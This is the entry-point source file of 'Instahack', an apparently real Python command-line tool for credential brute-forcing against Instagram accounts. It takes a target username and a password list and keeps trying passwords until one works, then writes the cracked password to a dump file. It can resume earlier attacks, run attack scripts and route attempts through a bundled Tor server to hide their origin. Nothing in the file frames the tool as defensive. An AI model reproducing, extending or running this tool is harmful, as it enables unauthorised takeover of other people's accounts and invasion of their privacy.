# The MIT License.
# Copyright (C) 2017 Evildevill , Waseem Akram.
#
# @filename    : __init__.py
# @description : The traditional python package __init__ file

import argparse
import os
import sys
from .InstahackWasiiCLI import InstahackWasiiCLI
from .InstahackWasiiSession import InstahackWasiiSession, DEFAULT_PATH
from .InstahackWasiiInstance import InstahackWasiiInstance
from .InstahackWasiiDumper import InstahackWasiiDumper
from .InstahackWasiiScript import InstahackWasiiScript
from .InstahackWasiiConfigurationCreator import InstahackWasiiConfigurationCreator
from .InstahackWasiiPortable import InstahackWasiiPortable
from datetime import datetime
from .AppInfo import appInfo as AppInformation
from .colors import *

__version__ = AppInformation['version']


'''
Arguments for instahack command-line tool
'''
cli_parser = argparse.ArgumentParser(
    epilog=AppInformation['example']
)

# nargs = '+' , makes them positional argument.
cli_parser.add_argument('--username',  # parse username from command line
                        '-u',
                        type=str,
                        help='username for Instagram account'
                        )

cli_parser.add_argument('--password-list',  # parse path to password list file
                        '-pl',
                        type=str,
                        help='password list file to try with the given username.'
                        )

cli_parser.add_argument('--script',
                        '-s',
                        type=str,
                        help='Instahack Attack Script.'
                        )

cli_parser.add_argument('--inspect-username',
                        '-i',
                        type=str,
                        help='Username to inspect in the instahack dump.'
                        )

cli_parser.add_argument('--create-configuration',
                        '-cc',
                        action='count',
                        help='Create a Configuration file for instahack with ease.'
                        )

cli_parser.add_argument('--default-configuration',
                        '-dc',
                        action='count',
                        help='noconfirm for instahack Configuration Creator!'
                        )

cli_parser.add_argument('--continue-attack',
                        '-c',
                        action='count',
                        help='Countinue the previous attack if found.'
                        )
cli_parser.add_argument('--verbose',  # check if the user wants verbose mode enabled
                        '-v',
                        action='count',
                        help='Activate Verbose mode. ( Verbose level )'
                        )


def ExecuteInstahackWasii():
    Parsed = cli_parser.parse_args()
    PortableService = None  # Later will be filled if portable is set.

    if Parsed.create_configuration is not None:
        if Parsed.default_configuration is not None:
            InstahackWasiiConfigurationCreator(os.path.expanduser(
                '~') + "/instahack-config.json").create()
        else:
            InstahackWasiiConfigurationCreator(os.path.expanduser(
                '~') + "/instahack-config.json").easy_create()
    elif Parsed.inspect_username is not None:
        InstahackWasiiDumper(Parsed.inspect_username).Dump()
    elif Parsed.script is not None:
        if not os.path.isfile(Parsed.script):
            print("No Attack Script found at {}".format(Parsed.script))

        # Pauses for 5 Seconds atleast if Portable is set.
        PortableService = InstahackWasiiPortable()
        if PortableService is not None:
            if PortableService.isSetInstahackWasiiPortable():
                if PortableService.isTorServerRunning() is False:
                    print(
                        "{}fatal error{}:: Failed to Start the In-Built Tor Server.".format(Fore.RED, Style.RESET_ALL))

        InstahackWasiiScript(Parsed.script, PortableService=PortableService).run()
    elif Parsed.username is not None and Parsed.password_list is not None:

        PortableService = InstahackWasiiPortable()
        if PortableService is not None:
            if PortableService.isSetInstahackWasiiPortable():
                if PortableService.isTorServerRunning() is False:
                    print(
                        "{}fatal error{}:: Failed to Start the In-Built Tor Server.".format(Fore.RED, Style.RESET_ALL))
                    sys.exit(-1)

        cli = InstahackWasiiCLI(appinfo=AppInformation,
                             started=datetime.now(),
                             verbose_level=Parsed.verbose, username=Parsed.username, PortableService=PortableService)
        cli.PrintHeader()
        cli.PrintDatetime()
        session = None

        INSTAPY_CONFIG = DEFAULT_PATH
        if PortableService is not None:
            if PortableService.isSetInstahackWasiiPortable():
                INSTAPY_CONFIG = PortableService.getInstahackWasiiConfigPath()

        session = InstahackWasiiSession(
            Parsed.username, Parsed.password_list, INSTAPY_CONFIG, DEFAULT_PATH, cli)
        session.ReadSaveFile(Parsed.continue_attack)
        InstahackWasii = InstahackWasiiInstance(cli, session)
        while not InstahackWasii.PasswordFound():
            InstahackWasii.TryPassword()
        session.WriteDumpFile(
            {
                "id": Parsed.username,
                "password": session.CurrentPassword(),
                "started": str(cli.started)
            }
        )
    else:
        cli_parser.print_help()

    # Make sure to close the tor server.
    if PortableService is not None:
        if PortableService.isSetInstahackWasiiPortable():
            if PortableService.isTorServerRunning():
                PortableService.terminate()
    print('\n{}If You Find Any Bug or issue kindly inform us, Thanks For using Instahack.{}{}https://github.com/evildevill/instahack{}'
          .format(Fore.GREEN,
                  Style.RESET_ALL,
                  Style.BRIGHT,
                  Style.RESET_ALL
                  ))
    sys.exit(0)
